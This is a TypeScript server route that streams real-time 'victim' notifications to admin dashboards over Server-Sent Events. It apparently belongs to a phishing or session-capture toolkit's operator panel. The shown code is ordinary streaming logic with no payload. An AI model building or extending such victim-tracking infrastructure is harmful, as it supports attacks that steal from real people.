import { Victim } from "@/lib/sessions";

/**
 * SSE (Server-Sent Events) endpoint for real-time updates
 * Admin dashboards connect here to receive live victim notifications
 */

// Store connected clients
const clients: Set<ReadableStreamDefaultController> = new Set();

/**
 * Notify all connected clients of a new victim
 */
export function notifyClients(victim: Victim): void {
    const data = JSON.stringify(victim);
    const message = `data: ${data}\n\n`;

    clients.forEach((controller) => {
        try {
            controller.enqueue(new TextEncoder().encode(message));
        } catch {
            // Client disconnected, will be cleaned up
            clients.delete(controller);
        }
    });
}

/**
 * GET /api/events
 * SSE endpoint for real-time victim notifications
 */
export async function GET(): Promise<Response> {
    const stream = new ReadableStream({
        start(controller) {
            // Add this client to the set
            clients.add(controller);

            // Send initial connection message
            const connectMessage = `data: ${JSON.stringify({ type: "connected" })}\n\n`;
            controller.enqueue(new TextEncoder().encode(connectMessage));

            // Heartbeat to keep connection alive
            const heartbeat = setInterval(() => {
                try {
                    const ping = `data: ${JSON.stringify({ type: "ping" })}\n\n`;
                    controller.enqueue(new TextEncoder().encode(ping));
                } catch {
                    clearInterval(heartbeat);
                    clients.delete(controller);
                }
            }, 30000); // Every 30 seconds

            // Cleanup on close
            return () => {
                clearInterval(heartbeat);
                clients.delete(controller);
            };
        },
        cancel() {
            // Client disconnected
        },
    });

    return new Response(stream, {
        headers: {
            "Content-Type": "text/event-stream",
            "Cache-Control": "no-cache, no-transform",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",
        },
    });
}
